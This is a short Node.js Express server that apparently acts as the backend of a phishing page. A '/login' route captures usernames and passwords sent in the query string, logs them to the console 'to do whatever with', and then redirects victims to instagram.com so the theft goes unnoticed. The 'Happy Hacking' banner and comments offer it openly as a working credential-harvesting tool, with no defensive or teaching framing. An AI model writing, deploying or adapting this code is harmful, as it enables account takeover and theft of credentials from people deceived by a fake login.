const express = require("express");

const app = express();

let html = `
<html>
 <style>
   body{
       margin: 0;
       padding: 0;
       background: #272727;
       color: #fff;
       font-family: sans-serif
   }

   .main{
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
   }
 </style>
 <body>
   <div class="main">
     <h1>Happy Hacking 😇</h1>
   </div>
 </body>
</html>
`;

app.get("/", (req, res) => {
  res.send(html);
});

app.get("/login", async(req, res) => {
  let username = await req.query.username;
  let password = await req.query.password;

  console.log(`${username} : ${password}`); // show username and password in console

  // do whatever with these
  
  res.redirect("http://instagram.com");//redirect as your wish
});


// server

const serverPort = process.env.PORT || 3000;

app.listen(serverPort, () => console.log(`happy-hacking@${serverPort}`));
